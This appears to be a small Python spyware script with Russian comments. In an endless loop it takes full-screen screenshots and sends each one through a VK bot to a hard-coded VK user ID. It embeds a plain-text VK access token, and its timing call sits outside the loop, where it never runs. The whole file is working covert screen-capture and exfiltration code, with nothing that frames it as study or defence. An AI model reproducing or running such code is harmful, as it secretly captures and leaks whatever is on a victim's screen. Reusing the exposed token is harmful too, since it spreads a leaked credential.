import getpass
import mss      #работа с скриншотами
import vk_api   #для разработки ботов ВК
import requests #модуль для работы со всеми видами HTTP-запросов
from random import randint
import time


FILE_NAME = "1.png"

#токен бота:
vk_session = vk_api.VkApi(token = '12ac98fa07875b01dd8f900d13a5f50c46e96ce1d263259df72ed37bf364820572bd171f8313463386288')
vk         = vk_session.get_api()

starttime=time.time()

while True:

             

        with mss.mss() as sct:
            sct.shot(output = FILE_NAME)

        url   = vk.photos.getMessagesUploadServer()['upload_url']
        photo = requests.post(url, files = {'photo': open(FILE_NAME, 'rb')}).json()
        save_ = vk.photos.saveMessagesPhoto(server = photo['server'], photo = photo['photo'], hash = photo['hash'])[0]

        vk.messages.send(
            user_id    = 387139933, # ТУТ ID ЮЗЕРА
            random_id  = randint(-2147483648, 2147483647),
            attachment = "photo%s_%s" % (save_['owner_id'], save_['id'])
        )
    
time.sleep(25.0 - ((time.time() - starttime) % 25.0))

#                           _  _  _  _  _                     _                                                               _                     _ 
#                          (_)(_)(_)(_)(_)                   (_)                                                             (_)                   (_)                          
#                          (_)       _         _     _  _  _ (_)     _             _  _  _  _       _  _  _       _  _  _  _  _     _  _  _  _   _ (_) _  _  _               _  
#                          (_) _  _ (_)       (_)  _(_)(_)(_)(_)   _(_)          _(_)(_)(_)(_)   _ (_)(_)(_) _  _(_)(_)(_)(_)(_)   (_)(_)(_)(_)_(_)(_)(_)(_)(_)_           _(_) 
#                          (_)(_)(_)(_)       (_) (_)        (_) _(_)           (_)_  _  _  _   (_)         (_)(_)           (_)  (_) _  _  _ (_)  (_)        (_)_       _(_)   
#                          (_)      (_)       (_) (_)        (_)(_)_              (_)(_)(_)(_)_ (_)         (_)(_)           (_)  (_)(_)(_)(_)(_)  (_)     _    (_)_   _(_)     
#                          (_)      (_)_  _  _(_)_(_)_  _  _ (_)  (_)_             _  _  _  _(_)(_) _  _  _ (_)(_)_  _  _  _ (_) _(_)_  _  _  _    (_)_  _(_)     (_)_(_)       
#                          (_)        (_)(_)(_) (_) (_)(_)(_)(_)    (_)           (_)(_)(_)(_)     (_)(_)(_)     (_)(_)(_)(_)(_)(_) (_)(_)(_)(_)     (_)(_)        _(_)         
#                                                                                                                                                             _  _(_)           
#                                                                                                                                                            (_)(_)             
